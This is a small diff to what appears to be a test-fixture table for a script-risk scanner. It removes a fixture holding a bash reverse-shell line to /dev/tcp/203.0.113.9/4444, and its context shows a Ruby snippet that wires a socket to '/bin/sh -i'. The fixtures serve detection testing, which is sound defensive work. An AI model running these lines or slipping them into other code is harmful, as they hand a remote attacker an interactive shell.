@@ -54,11 +54,6 @@ _OPEN = {
         "[0, 1, 2].each { |fd| IO.new(fd).reopen(s) }\n"
         'exec("/bin/sh -i")\n',
     ),
-    # A reverse shell on its own is a risky construct (pentest tooling ships the same lines).
-    "lone-bash-reverse-shell": (
-        "agent.sh",
-        f"#!/bin/sh\n# {_FIXTURE}\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n",
-    ),
     # A Run value that starts a local script is what many honest installers write.
     "runkey-local-agent": (
         "install.ps1",
